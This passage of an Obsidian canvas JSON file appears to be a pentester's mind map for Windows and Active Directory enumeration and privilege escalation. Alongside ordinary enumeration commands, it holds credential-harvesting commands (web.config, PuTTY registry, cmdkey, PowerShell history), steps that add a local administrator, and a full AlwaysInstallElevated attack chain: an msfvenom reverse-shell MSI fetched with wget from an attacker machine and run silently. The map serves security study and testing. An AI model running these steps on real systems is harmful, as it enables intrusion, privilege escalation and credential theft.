		{"id":"8d1b4c5e91e99b76","type":"text","text":"* **What to Look For**: The current username. Identify if the user is an admin or belongs to privileged groups.\n- **Potential Exploit**: If the user is an admin, directly attempt Privesc sub-node number 1. If not, look for misconfigurations.\n- **Look for**: Any high-value privileges that are enabled. Common ones include:\n    - **SeDebugPrivilege**: Allows debugging of processes, often used to escalate privileges.\n    - **SeImpersonatePrivilege**: Allows the user to impersonate another user.\n    - **SeBackupPrivilege** and **SeRestorePrivilege**: Can be used to back up and restore files, potentially overwriting sensitive system files. \n``` Powershell\n#Get all information about current user, take a look at the enabled tokens\nwhoami /all\n\n#Show only privileges\nwhoami /priv\n\n#Get information about specific user\nnet user < UserName > \n```\n\n``` PowerShell\n# Get information about specific local user\nGet-WmiObject -Class Win32_UserAccount -Filter \"Name=< UserName >\"\nGet-LocalUser -Name duser | Select * \n```","x":1580,"y":3841,"width":1000,"height":560,"color":"3"},
		{"id":"ba5e554d0c838dcb","type":"text","text":"**Look for:** store passwords for databases or configured authentication mechanisms\n```\ntype C:\\inetpub\\wwwroot\\web.config | findstr connectionString\ntype C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionString\n```\n","x":3640,"y":3158,"width":900,"height":150,"color":"#0599f5"},
		{"id":"0bf5a1b849ae43f4","type":"text","text":"**While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.**\n\n```\nreg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f \"Proxy\" /s\n```\n\n**Note:** Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.\nJust as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved","x":3640,"y":3333,"width":1140,"height":287,"color":"#0599f5"},
		{"id":"c92c43aa886618cd","type":"text","text":"``` powershell\n## Add local user and put them local Administrators group\nnet user username password /ADD\nnet localgroup Administrators username /ADD\n\n# Add user to insteresting groups\nnet localgroup \"< Remote Desktop Users | Power users | Debugger users >\" UserLoginName  /add\n```","x":3680,"y":3660,"width":860,"height":200,"color":"3"},
		{"id":"b30f7807d972baf1","type":"text","text":"``` powershell\n## List credential\ncmdkey /list \n\n## List Windows vault\nvaultcmd /listcreds:\"Windows Credentials\" /all \n\n## You need graphical access\nrundll32 keymgr.dll, KRShowKeyMgr \n```","x":3758,"y":4010,"width":664,"height":245,"color":"3"},
		{"id":"5e3a6e70dc9bc222","type":"text","text":"``` Powershell \n#List sessions\nqwinsta\nklist sessions\n```","x":2805,"y":3784,"width":303,"height":114,"color":"3"},
		{"id":"3ed48e94757891c5","type":"text","text":"- **Look for**:\n     - **Local Group Memberships**: Membership in groups like `Administrators`, `Server Operators`, `Backup Operators`, etc., can provide elevated privileges.\n   - **Account Settings**: Check if the account has any special configurations, such as password never expiring, or if the user has the ability to change their password.\n``` powershell\n#All available groups\nnet localgroup \n\n#Info about specific a group\nnet localgroup < GroupName > \n\n#Add user to group\nnet localgroup < GroupName > < UserName > /add \n```","x":1580,"y":4441,"width":780,"height":396,"color":"3"},
		{"id":"a3af13c29c7c986e","type":"text","text":"``` powershell\n## Lists all known hosts stored in the arp table.\narp -a \nGet-NetNeighbor\n\n## Prints out adapter settings for the host.\nipconfig /all  \nGet-NetIPAddress\n\n## Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.\nroute print\nGet-NetRoute\n\n\nnetsh advfirewall show state  ## Displays the status of the host's firewall. We can determine if it is active and filtering traffic.\n```","x":1580,"y":4889,"width":780,"height":422},
		{"id":"ea91928f7ddfc9f0","type":"text","text":"``` powershell\n## List or disconnect sessions with the computer.\nnet session\n## check and see if you are the only one logged in\nqwinsta\n```","x":1577,"y":5520,"width":800,"height":146},
		{"id":"784329b04ea79f41","type":"text","text":"``` powershell\n## Check shared files on network\nnet share\n```","x":1580,"y":5357,"width":797,"height":107},
		{"id":"ae863a09f9efa0b4","type":"text","text":"## Event Logs","x":2268,"y":2784,"width":336,"height":72,"color":"5"},
		{"id":"3f3bc9f3ddbddb3d","type":"text","text":"``` powershell\n# Lists all available event logs on the system.\nwevtutil el\nGet-EventLog -List\n\n# Queries specific event logs to retrieve the latest entries\nwevtutil qe System /c:5 /f:text\n\n# Lists all event logs using the newer event logging system\nGet-WinEvent -ListLog *\n\n# Retrieves a specified number of recent entries from a specific event log\nGet-EventLog -LogName System -Newest 10\nGet-WinEvent -LogName System -MaxEvents 10\n\n```","x":2836,"y":2785,"width":720,"height":373,"color":"5"},
		{"id":"090194c0627c8cb0","type":"text","text":"## Check for Installer Registries","x":2276,"y":2659,"width":392,"height":79,"color":"#058ffd"},
		{"id":"4d15de64f1165254","type":"text","text":"## HotFixes and Updates","x":1676,"y":2738,"width":336,"height":65,"color":"5"},
		{"id":"8b1a617012d650e7","type":"text","text":"``` powershell\n# Lists all installed software products\nwmic product get Name, Version, InstallDate\nGet-WmiObject -Class Win32_Product\n\n# Lists all packages installed on the system\nGet-Package\n```","x":2836,"y":3184,"width":720,"height":191,"color":"5"},
		{"id":"4bbf093ef181fa49","type":"text","text":"``` powershell\n## check and see if you are the only one logged in\nqwinsta\n```","x":2960,"y":3640,"width":680,"height":100,"color":"5"},
		{"id":"925158903f89e395","type":"text","text":"``` powershell\n#Check if you are Admin\n$cuaccess=[System.Security.Principal.WindowsIdentity]::GetCurrent()\n$cuprivilege=New-Object System.Security.Principal.WindowsPrincipal($cuaccess)\n$cuprivilege.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)\n```","x":2840,"y":3941,"width":805,"height":137,"color":"3"},
		{"id":"1994f82f8b8512f8","type":"text","text":" - **Look for**: Weak account policies, such as no password requirements, which could be exploited.\n``` powershell\n## Information about password requirements\nnet accounts \n```","x":2840,"y":4121,"width":823,"height":143,"color":"3"},
		{"id":"d5bfda678c4005d0","type":"text","text":"1. **`icacls\\ Get-ACL`**:\n    \n    - Displays or modifies discretionary access control lists (DACLs) on specified files.\n        - **Look for**:\n            - Files or folders where the current user has write permissions. This can be used to replace executable files with malicious ones.\n            - Misconfigured permissions that allow broader access than \n\n``` powershell\n## Display access control lists (ACL) on specified files.\nicacls \"C:\\example\\file.txt\"\n\nGet-Acl \"C:\\example\\file.txt\"\n```\n\n```PowerShell\n## Get access control lists (ACL) of all files and folders within a directory recursively:\nicacls \"C:\\example\\folder\" /T\n\nGet-ChildItem \"C:\\example\\folder\\\" -Recurse | Get-Acl | Format-Table \n```","x":2840,"y":4301,"width":923,"height":454,"color":"3"},
		{"id":"3b898aa7f6fe1202","type":"text","text":"``` powershell\n## Provides detailed system information, including system boot time\nsysteminfo | find \"System Boot Time\"\n\n## Retrieves the last boot-up time of the operating system\n(Get-CimInstance -ClassName Win32_OperatingSystem).LastBootUpTime\n```","x":2836,"y":3415,"width":680,"height":180,"color":"5"},
		{"id":"122733e5cf29c97d","type":"text","text":"```powershell\n$suspiciousKeywords = \"vuln\", \"suspicious\", \"malware\"\n$services = Get-Service | Where-Object {\n    $_.Name -match ($suspiciousKeywords -join \"|\")\n}\n\nforeach ($service in $services) {\n    Write-Output \"Service Name: $($service.Name)\"\n    Write-Output \"Service Display Name: $($service.DisplayName)\"\n    Write-Output \"Service Status: $($service.Status)\"\n    \n    $serviceDetails = Get-WmiObject -Class Win32_Service -Filter \"Name='$($service.Name)'\" | Format-List *\n    Write-Output $serviceDetails\n    \n    $servicePath = $serviceDetails.PathName\n    Write-Output \"Service Path: $servicePath\"\n    \n    $acl = Get-Acl $servicePath | Format-List\n    Write-Output $acl\n}\n\n```","x":1616,"y":1819,"width":1096,"height":521},
		{"id":"e0129930dad8eeba","type":"text","text":"### $ServicePath ?","x":1640,"y":1700,"width":250,"height":60},
		{"id":"2b689f4d5e70d54e","type":"text","text":"## System Drivers","x":2268,"y":2571,"width":336,"height":69,"color":"5"},
		{"id":"85f1b08da9f60486","type":"text","text":"## Firewall","x":1676,"y":2545,"width":336,"height":60,"color":"5"},
		{"id":"f07066d567be9f7c","type":"text","text":"## Saved Credentials","x":2356,"y":3154,"width":336,"height":60,"color":"#0599f5"},
		{"id":"f0ee24b1276def9e","type":"text","text":"## Initial informations","x":1951,"y":3149,"width":317,"height":69,"color":"5"},
		{"id":"d590cb6ac5ed98f5","type":"text","text":"## Group Policy ","x":1676,"y":2920,"width":336,"height":86,"color":"5"},
		{"id":"176c9b654332b164","type":"text","text":"## Installed Software","x":2268,"y":3020,"width":336,"height":65,"color":"5"},
		{"id":"8071303e71f3c9d6","type":"text","text":"## PowerShell History","x":2356,"y":2899,"width":336,"height":72,"color":"#0599f5"},
		{"id":"1119dcefec71ec4a","type":"text","text":"### Escalate While Installing","x":3499,"y":1611,"width":250,"height":77,"color":"#0400ff"},
		{"id":"fe4ea51386701d2d","type":"text","text":"`# Create the 'Installer' key if it doesn't exist`\n`New-Item -Path \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\Installer\" -Force`\n\n`# Create the 'AlwaysInstallElevated' DWORD value and set it to 1`\n`New-ItemProperty -Path \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\Installer\" -Name \"AlwaysInstallElevated\" -PropertyType DWord -Value 1`\n\n\n`reg add \"HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\" /v AlwaysInstallElevated /t REG_DWORD /d 1 /f`\n","x":4133,"y":1508,"width":980,"height":283,"color":"#0400ff"},
		{"id":"d8533c9cf8c921a6","type":"text","text":"```CMD\n# Checks the machine level registry key.\nReg Query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\n```\n**Look for** output something similar to the following\n    HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Installer\n        AlwaysInstallElevated    REG_DWORD    0x1\n        DisableMSI    REG_DWORD    0x0\n\n\n```CMD\n# Check our user key, which is in the current user hive. \nReg Query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\n```\n**Look for** output something similar to the following\n    HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer \n        AlwaysInstallElevated REG_DWORD 0x1\n**Note:** To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using `msfvenom`.\n","x":3496,"y":1966,"width":1065,"height":454,"color":"#058ffd"},
		{"id":"e160eb1029a9134f","type":"text","text":"If you checked those registry keys and those seemed similar to the above ones, you can create a payload, upload it to the target and spin up netcat listener and run that payload to get privileged shell. Here are the steps:\n### On Kali \n1. Create a payload with msfvenom:\n``` bash\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o privesc.msi\n```\n2. Spin up a python server:\n``` bash\npython -m http.server 7180\n```\n\n3. Set up a netcat listener:\n```bash\nnc -lvnp 2626\n``` \n\nOn Windows\n2. Download the malicious file:\n``` powershell\nwget http://192.168.109.130:7180/privesc.msi -o privesc.msi\n```\n\n5. Run the payload:\n``` powershell\nmsiexec /quiet /qn /i privesc.msi\n``` ","x":4716,"y":1842,"width":1667,"height":703,"color":"#0400ff"},
		{"id":"52e4812348bdb22c","type":"text","text":"``` powershell\n# Lists all drivers installed on the system\ndriverquery\n\n# Provides detailed information about each driver\ndriverquery /v\n\n# Retrieves details about system drivers using WMI\nGet-WmiObject -Class Win32_SystemDriver | Format-List *\n```","x":2713,"y":2479,"width":720,"height":252,"color":"5"},
		{"id":"916af1f16a1123c0","type":"text","text":" **Look for:** commands that includes a password directly as part of the PowerShell command line\n\n``` powershell\ntype %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt # or\ntype $Env:userprofile\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt # Get Powershell History\n\nGet-Clipboard # Get last copied thing\n```\n* If there are any credentials, those could be useful to escalate privileges\n","x":3496,"y":2479,"width":1143,"height":252,"color":"#0599f5"},
		{"id":"1bcad6de7b2808ec","type":"text","text":"```PowerShell\nGet-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\n```\n\n```PowerShell\n# Retrieve information about installed software under \"Uninstall\" registry key\n$software = Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | \n    Where-Object { $_.DisplayName -ne $null } | \n    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate\n\n# Display the retrieved information\n$software\n\n```","x":4340,"y":2803,"width":880,"height":316,"color":"5"},
		{"id":"07118be53d806c00","type":"text","text":"**Look For:**\n* Outdated software versions that might have known vulnerabilities.    \n* Software dependencies or third-party libraries installed by applications. Vulnerabilities in these dependencies could be exploited to compromise the security of the system","x":4870,"y":2583,"width":700,"height":202,"color":"5"},
		{"id":"720845d99c221856","type":"text","text":"## Initial information","x":883,"y":5070,"width":357,"height":60},
		{"id":"76d5010c1f050777","type":"text","text":"## Network Enumeration","x":224,"y":5380,"width":336,"height":65},
		{"id":"600906e6cbe095c9","type":"text","text":"## Scheduler Enumeration","x":224,"y":600,"width":336,"height":90},
		{"id":"ce9ccc7c0e51dd61","type":"text","text":"## Domain Trust","x":883,"y":188,"width":357,"height":78,"color":"6"},
		{"id":"0fd625fb25bd7682","type":"text","text":"``` powershell\n# Retrieves details about the CPU \nwmic cpu get Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed\nGet-CimInstance -ClassName Win32_Processor\n\n# Provides information about the memory modules installed\nwmic memorychip get BankLabel, Capacity, Speed, Manufacturer, PartNumber\nGet-CimInstance -ClassName Win32_PhysicalMemory\n\n# Lists details of disk drives \nwmic diskdrive get Model, Size, MediaType, SerialNumber\nGet-CimInstance -ClassName Win32_DiskDrive\n```\n","x":776,"y":3270,"width":750,"height":325,"color":"5"},
		{"id":"a53192eaeafaaa4c","type":"text","text":"``` powershell\n## checked if Defender was running\nsc query windefend\n## check the status and configuration settings with the Get-MpComputerStatus\nGet-MpComputerStatus\n```","x":776,"y":3640,"width":750,"height":160,"color":"5"},
		{"id":"498e2d04cf912642","type":"text","text":"## User Enumeration","x":883,"y":4082,"width":357,"height":78,"color":"3"},
		{"id":"80d543da47127673","type":"text","text":"## System Enumeration\n","x":224,"y":3134,"width":336,"height":80,"color":"5"},
		{"id":"e52f0d2795d28cb6","type":"text","text":"## Users and groups Enumeration","x":224,"y":4281,"width":336,"height":99,"color":"3"},
		{"id":"cec118cde28f7148","type":"text","text":"## Group Enumeration","x":883,"y":4595,"width":357,"height":89,"color":"3"},
		{"id":"cc7ad6932ca73d55","type":"text","text":"## Network connections","x":880,"y":5568,"width":357,"height":50},
		{"id":"88d8fd350f60d743","type":"text","text":"## Network share ","x":883,"y":5380,"width":357,"height":60},
		{"id":"a05de09f9d7dad60","type":"text","text":"## Check scheduled tasks.","x":883,"y":607,"width":357,"height":69},
		{"id":"f82fa6fce5beb074","type":"text","text":"## Check all services","x":883,"y":1261,"width":357,"height":80},
		{"id":"10e38a401095bdbb","type":"text","text":"## Service Enumeration","x":224,"y":1571,"width":336,"height":80},
		{"id":"66bb7c823362e9e8","type":"text","text":"## NTLM\\Kerberos Enumeration ","x":224,"y":-2870,"width":336,"height":77},
		{"id":"0deb57519b817e85","type":"text","text":"## Running the Enumeration in Scripted Form","x":880,"y":1960,"width":357,"height":100},
		{"id":"09ac2679e50f6d23","type":"text","text":"``` powershell\n# Displays the current configuration of the Windows Firewall, including settings for all profiles (domain, private, and public)\nnetsh advfirewall show allprofiles\n\n# Retrieves the list of firewall rules configured on the system\nGet-NetFirewallRule\n```","x":776,"y":2260,"width":720,"height":200,"color":"5"},
		{"id":"0293d6c1b4598b68","type":"text","text":"## Local","x":-220,"y":2460,"width":250,"height":60},
		{"id":"724e56c410ad7ba7","type":"text","text":"**Look For:**\n- Outdated or missing updates that could be exploited using known exploits or vulnerabilities.\n- Any errors or failures during update installation. Failed updates might indicate a misconfiguration or issue that could be exploited.\n- Check for known vulnerabilities associated with installed updates or hotfixes. Look for references to CVEs (Common Vulnerabilities and Exposures) or security bulletins.","x":160,"y":2445,"width":582,"height":270,"color":"5"},
		{"id":"a4fb9ae693757365","type":"text","text":"``` powershell\n## Prints the patch level and description of the Hotfixes applied\nwmic qfe get Caption,Description,HotFixID,InstalledOn\nGet-HotFix\n\nGet-WindowsUpdateLog \nGet-Content WindowsUpdate.log #You may need to filter the output\n```","x":776,"y":2490,"width":720,"height":180,"color":"5"},
		{"id":"32a7a61fd959c561","type":"text","text":"``` Powershell\n# Displays the resultant set of policies for the current user\ngpresult /r\n# Generates an HTML report of the resultant set of policies for the system and user\ngpresult /h gpreport.html\n```","x":776,"y":2720,"width":800,"height":166,"color":"5"},
		{"id":"2bef54ee213a771b","type":"text","text":"## Script Enumeration","x":224,"y":-980,"width":336,"height":67,"color":"2"},
		{"id":"f9004794f97d0244","type":"text","text":"``` powershell\n# Import required modules\nImport-Module ActiveDirectory\n\n# Get current domain\n$currentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()\n\n# Enumerate domain controllers\n$domainControllers = Get-ADDomainController -Filter *\n\n# Display domain controller information\nforeach ($dc in $domainControllers) {\n    Write-Host \"Domain Controller: $($dc.HostName)\"\n    Write-Host \"  IP Address: $($dc.IPAddress)\"\n    Write-Host \"  Site: $($dc.Site)\"\n    Write-Host \"  OS Version: $($dc.OperatingSystem)\"\n    Write-Host \"  OS Service Pack: $($dc.OperatingSystemServicePack)\"\n    Write-Host \"\"\n}\n\n# Enumerate domain users\n$domainUsers = Get-ADUser -Filter *\nWrite-Host \"Domain Users:\"\nforeach ($user in $domainUsers) {\n    Write-Host \"  $($user.SamAccountName) - $($user.Name)\"\n}\n\n# Enumerate domain groups\n$domainGroups = Get-ADGroup -Filter *\nWrite-Host \"Domain Groups:\"\nforeach ($group in $domainGroups) {\n    Write-Host \"  $($group.Name)\"\n}\n\n# Enumerate domain computers\n$domainComputers = Get-ADComputer -Filter *\nWrite-Host \"Domain Computers:\"\nforeach ($computer in $domainComputers) {\n    Write-Host \"  $($computer.Name)\"\n}\n\n# Get domain password policy\n$domainPolicy = Get-ADDefaultDomainPasswordPolicy\nWrite-Host \"Domain Password Policy:\"\nWrite-Host \"  MaxPasswordAge: $($domainPolicy.MaxPasswordAge)\"\nWrite-Host \"  MinPasswordLength: $($domainPolicy.MinPasswordLength)\"\nWrite-Host \"  PasswordComplexity: $($domainPolicy.PasswordHistoryCount)\"\n\n```","x":560,"y":-2393,"width":846,"height":1074,"color":"2"},
		{"id":"a0b43af4b97d53e5","type":"text","text":"## AD Common-Name(CN) enumeration","x":900,"y":-704,"width":340,"height":84,"color":"6"},
		{"id":"e6154d5f4d65e09d","type":"text","text":"## AD Enumeration","x":224,"y":-366,"width":336,"height":86,"color":"6"},
		{"id":"c5163b6b6363c2cc","type":"text","text":"## Domain","x":-220,"y":-700,"width":250,"height":60},
		{"id":"47278f5e45b06dbf","type":"text","text":"## AD  Domain and Forest enumeration","x":883,"y":-220,"width":357,"height":78,"color":"6"}
	],
	"edges":[
		{"id":"d0dc2ab83ca8de65","fromNode":"be46450db2cae69a","fromSide":"right","toNode":"179094e6ba2d2b2c","toSide":"left"},
		{"id":"64037bd9776cb381","fromNode":"179094e6ba2d2b2c","fromSide":"right","toNode":"c5163b6b6363c2cc","toSide":"left"},
		{"id":"78f90cab6eb5565b","fromNode":"179094e6ba2d2b2c","fromSide":"right","toNode":"0293d6c1b4598b68","toSide":"left"},
		{"id":"45a63d56fe5e62ee","fromNode":"0293d6c1b4598b68","fromSide":"right","toNode":"600906e6cbe095c9","toSide":"left"},
		{"id":"feef6b662059d6df","fromNode":"0293d6c1b4598b68","fromSide":"right","toNode":"e52f0d2795d28cb6","toSide":"left","color":"3"},
		{"id":"f066da1ae1b1a9e4","fromNode":"a05de09f9d7dad60","fromSide":"right","toNode":"a0b951863e97e01b","toSide":"left"},
		{"id":"9415289301901b53","fromNode":"a0b951863e97e01b","fromSide":"right","toNode":"dfb727dcc6ed7eae","toSide":"left"},
		{"id":"11b1596ade6b48cf","fromNode":"dfb727dcc6ed7eae","fromSide":"right","toNode":"2c065c4f9b53fb4d","toSide":"left"},
		{"id":"8c2d9c467bb8943c","fromNode":"2c065c4f9b53fb4d","fromSide":"right","toNode":"e05e9a5b1a82d0d1","toSide":"left"},
		{"id":"ac086375b62ddb69","fromNode":"2c065c4f9b53fb4d","fromSide":"right","toNode":"71c0359516cb7711","toSide":"left"},
		{"id":"c1fa3262c8305e48","fromNode":"600906e6cbe095c9","fromSide":"right","toNode":"a05de09f9d7dad60","toSide":"left"},
		{"id":"22a141cd8ad54b9b","fromNode":"5e48ae0e0f1ab924","fromSide":"right","toNode":"7d70237c675cebc5","toSide":"left"},
		{"id":"42b77c46047d6265","fromNode":"47278f5e45b06dbf","fromSide":"right","toNode":"71d7fa52d78485de","toSide":"left","color":"6"},
		{"id":"22b99275640bb6ef","fromNode":"c5163b6b6363c2cc","fromSide":"right","toNode":"e6154d5f4d65e09d","toSide":"left","color":"6"},
		{"id":"eef0944c9b8ba064","fromNode":"e6154d5f4d65e09d","fromSide":"right","toNode":"a0b43af4b97d53e5","toSide":"left","color":"6"},
		{"id":"056cc2c7b2f13dab","fromNode":"a0b43af4b97d53e5","fromSide":"right","toNode":"91e94e49805a18e0","toSide":"left","color":"6"},
		{"id":"0b118a4cd896421b","fromNode":"e6154d5f4d65e09d","fromSide":"right","toNode":"47278f5e45b06dbf","toSide":"left","color":"6"},
		{"id":"b9e3d6a09db196d1","fromNode":"e6154d5f4d65e09d","fromSide":"right","toNode":"ce9ccc7c0e51dd61","toSide":"left","color":"6"},
		{"id":"a02c5f81c07a578b","fromNode":"ce9ccc7c0e51dd61","fromSide":"right","toNode":"95ca6015ba1034aa","toSide":"left","color":"6"},
		{"id":"230f321fca9dbe80","fromNode":"a0b43af4b97d53e5","fromSide":"right","toNode":"ff732b12b148d58e","toSide":"left","color":"6"},
		{"id":"b85c92a4fe6c6797","fromNode":"10e38a401095bdbb","fromSide":"right","toNode":"f82fa6fce5beb074","toSide":"left"},
		{"id":"98cdda12da75a09e","fromNode":"f82fa6fce5beb074","fromSide":"right","toNode":"c814b6cece9faa34","toSide":"left"},
		{"id":"e47ac01657f5e523","fromNode":"c814b6cece9faa34","fromSide":"right","toNode":"91239944f8a7edd5","toSide":"left"},
		{"id":"32c2e64c84a32be7","fromNode":"91239944f8a7edd5","fromSide":"right","toNode":"c226757e89689a23","toSide":"left"},
		{"id":"f40d639b6d8369a5","fromNode":"0deb57519b817e85","fromSide":"right","toNode":"122733e5cf29c97d","toSide":"left"},
		{"id":"128634931926b9bc","fromNode":"176c9b654332b164","fromSide":"right","toNode":"8b1a617012d650e7","toSide":"left","color":"5"},
		{"id":"34476646e881aa04","fromNode":"ae863a09f9efa0b4","fromSide":"right","toNode":"3f3bc9f3ddbddb3d","toSide":"left","color":"5"},
		{"id":"82071a1b1c495311","fromNode":"2b689f4d5e70d54e","fromSide":"right","toNode":"52e4812348bdb22c","toSide":"left"},
		{"id":"5b311d136d354ac4","fromNode":"27058d0c157af620","fromSide":"right","toNode":"3b898aa7f6fe1202","toSide":"left","color":"5"},
		{"id":"d9d921b3c39b2d07","fromNode":"0293d6c1b4598b68","fromSide":"right","toNode":"10e38a401095bdbb","toSide":"left"},
		{"id":"3ea341192c58d69e","fromNode":"10e38a401095bdbb","fromSide":"right","toNode":"0deb57519b817e85","toSide":"left"},
		{"id":"d5cdbbb95c7618f6","fromNode":"c5163b6b6363c2cc","fromSide":"right","toNode":"66bb7c823362e9e8","toSide":"left"},
		{"id":"d88ab4245281b275","fromNode":"66bb7c823362e9e8","fromSide":"right","toNode":"069f95b3afe3e7f8","toSide":"left"},
		{"id":"da248f8481a6bbf7","fromNode":"66bb7c823362e9e8","fromSide":"right","toNode":"70cb92a429e23f5a","toSide":"left"},
		{"id":"a54df5e73393c1e4","fromNode":"66bb7c823362e9e8","fromSide":"right","toNode":"f4ac75b58e011232","toSide":"left"},
		{"id":"82ea11501303ec2a","fromNode":"66bb7c823362e9e8","fromSide":"right","toNode":"35c0d89f91ba38a3","toSide":"left"},
		{"id":"5b21be20a307ab64","fromNode":"e52f0d2795d28cb6","fromSide":"right","toNode":"cec118cde28f7148","toSide":"left","color":"3"},
		{"id":"2b5a93c9f3b7a379","fromNode":"8d1b4c5e91e99b76","fromSide":"right","toNode":"925158903f89e395","toSide":"left","color":"3"},
		{"id":"bcd24a06cd4f0f03","fromNode":"8d1b4c5e91e99b76","fromSide":"right","toNode":"1994f82f8b8512f8","toSide":"left","color":"3"},
		{"id":"61be227fc19745bb","fromNode":"925158903f89e395","fromSide":"top","toNode":"c92c43aa886618cd","toSide":"left","color":"3","label":"If you are Administrator"},
		{"id":"64704012f055102d","fromNode":"8d1b4c5e91e99b76","fromSide":"right","toNode":"5e3a6e70dc9bc222","toSide":"left","color":"3"},
		{"id":"b48d4acf9c4ecccf","fromNode":"8d1b4c5e91e99b76","fromSide":"right","toNode":"d5bfda678c4005d0","toSide":"left","color":"3"},
		{"id":"97ead2a3e8e93f01","fromNode":"3ed48e94757891c5","fromSide":"right","toNode":"d5bfda678c4005d0","toSide":"left","color":"3"},
		{"id":"4ca736bb2e084004","fromNode":"cec118cde28f7148","fromSide":"right","toNode":"3ed48e94757891c5","toSide":"left","color":"3"},
		{"id":"0d294e35a2ec3dcd","fromNode":"374c876881c8bb7c","fromSide":"right","toNode":"703c7defdf6773d9","toSide":"left","color":"6"},
		{"id":"697849f21e68f9d8","fromNode":"91e94e49805a18e0","fromSide":"right","toNode":"d01ff3ae477bd6d8","toSide":"left","color":"6"},
		{"id":"2b7296f76c7f7caf","fromNode":"d01ff3ae477bd6d8","fromSide":"right","toNode":"9ac754a60f9e613f","toSide":"left","color":"6"},
		{"id":"deadeb007c6dc6b9","fromNode":"9ac754a60f9e613f","fromSide":"right","toNode":"46c1560599835fe5","toSide":"left","color":"6"},
		{"id":"26dcda0c74e9781f","fromNode":"ff732b12b148d58e","fromSide":"right","toNode":"ea7f2a13f546dc8d","toSide":"left","color":"6"},
		{"id":"9c3fd7a09d075ebf","fromNode":"e52f0d2795d28cb6","fromSide":"right","toNode":"498e2d04cf912642","toSide":"left","color":"3"},
		{"id":"17ccd66fd883dc6f","fromNode":"498e2d04cf912642","fromSide":"right","toNode":"8d1b4c5e91e99b76","toSide":"left","color":"3"},
		{"id":"0342c7e3ab86848a","fromNode":"6dccd093c14f4c8c","fromSide":"right","toNode":"2af816f32de2763b","toSide":"left"},
		{"id":"8d343297a3b161ad","fromNode":"2af816f32de2763b","fromSide":"right","toNode":"27d3f31dc58e04ae","toSide":"left"},
		{"id":"1ca647ec32d065b4","fromNode":"ea7f2a13f546dc8d","fromSide":"right","toNode":"9ac754a60f9e613f","toSide":"left","color":"6"},
		{"id":"b1fbc5ca72aa23e9","fromNode":"ff732b12b148d58e","fromSide":"right","toNode":"374c876881c8bb7c","toSide":"left","color":"6"},
		{"id":"3f543f329a737428","fromNode":"91e94e49805a18e0","fromSide":"right","toNode":"374c876881c8bb7c","toSide":"left","color":"6"},
		{"id":"67e107fbb5d6cfc3","fromNode":"703c7defdf6773d9","fromSide":"right","toNode":"57a21e56f2b5da47","toSide":"left","color":"6"},
		{"id":"e33215926e79a1cf","fromNode":"57a21e56f2b5da47","fromSide":"right","toNode":"2c9957cc781b9ceb","toSide":"left","color":"6"},
		{"id":"35c1fb53f74ad37e","fromNode":"0293d6c1b4598b68","fromSide":"right","toNode":"80d543da47127673","toSide":"left"},
		{"id":"a9826caa786bf555","fromNode":"80d543da47127673","fromSide":"right","toNode":"f0ee24b1276def9e","toSide":"left","color":"5"},
		{"id":"4b90a7b3f7eab45e","fromNode":"f0ee24b1276def9e","fromSide":"top","toNode":"d590cb6ac5ed98f5","toSide":"right","color":"5"},
		{"id":"02906c5d1426f32f","fromNode":"d590cb6ac5ed98f5","fromSide":"left","toNode":"32a7a61fd959c561","toSide":"right","color":"5"},
		{"id":"41c150a70b548c89","fromNode":"f0ee24b1276def9e","fromSide":"top","toNode":"4d15de64f1165254","toSide":"right","color":"5"},
		{"id":"ff0259881161ef7c","fromNode":"4d15de64f1165254","fromSide":"left","toNode":"a4fb9ae693757365","toSide":"right","color":"5"},
		{"id":"07f86160ea87f7b5","fromNode":"f0ee24b1276def9e","fromSide":"top","toNode":"85f1b08da9f60486","toSide":"right","color":"5"},
		{"id":"ff1b9396b8e09406","fromNode":"85f1b08da9f60486","fromSide":"left","toNode":"09ac2679e50f6d23","toSide":"right","color":"5"},
		{"id":"c24b720095f17896","fromNode":"f0ee24b1276def9e","fromSide":"top","toNode":"2b689f4d5e70d54e","toSide":"left","color":"5"},
		{"id":"f099c312619c8559","fromNode":"f0ee24b1276def9e","fromSide":"top","toNode":"ae863a09f9efa0b4","toSide":"left","color":"5"},
		{"id":"c6f4a3beb2eda010","fromNode":"f0ee24b1276def9e","fromSide":"top","toNode":"176c9b654332b164","toSide":"left","color":"5"},
		{"id":"ee7dbf637777a9a3","fromNode":"f0ee24b1276def9e","fromSide":"bottom","toNode":"27058d0c157af620","toSide":"left","color":"5"},
		{"id":"e93e633d49558d88","fromNode":"f0ee24b1276def9e","fromSide":"bottom","toNode":"608fdb9ce399c55d","toSide":"right","color":"5"},
		{"id":"1c8e8a818911b036","fromNode":"608fdb9ce399c55d","fromSide":"left","toNode":"0fd625fb25bd7682","toSide":"right","color":"5"},
		{"id":"5d73869d68943ec9","fromNode":"f0ee24b1276def9e","fromSide":"bottom","toNode":"a76559cfff78391f","toSide":"right","color":"5"},
